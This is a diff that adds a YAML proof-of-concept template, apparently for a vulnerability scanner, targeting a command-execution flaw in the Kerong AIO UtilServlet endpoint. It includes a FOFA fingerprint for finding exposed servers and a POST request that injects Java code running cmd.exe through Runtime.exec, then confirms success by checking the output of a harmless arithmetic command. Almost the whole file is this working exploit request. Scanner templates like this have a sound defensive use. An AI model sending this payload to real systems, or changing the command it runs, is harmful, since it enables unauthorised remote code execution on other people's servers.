@@ -1,0 +1,28 @@
+id: poc-yaml-kerong-aio-utilservlet-rce
+info:
+  name: 科荣AIO UtilServlet 任意命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 科荣AIO
+  fofa: body="changeAccount('8000')"
+variables:
+  t1: random_int(100,999)
+  t2: random_int(100,999)
+  t3: t1*t2
+requests:
+- method: POST
+  path: /UtilServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+set+/a+{{.t1}}*{{.t2}}").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
+  expression: 'status_code == 200 &&
+
+    contains(body,t3) &&
+
+    !contains(body,"<") &&
+
+    contains(headers,"text/html")
+
+    '
+transport: http
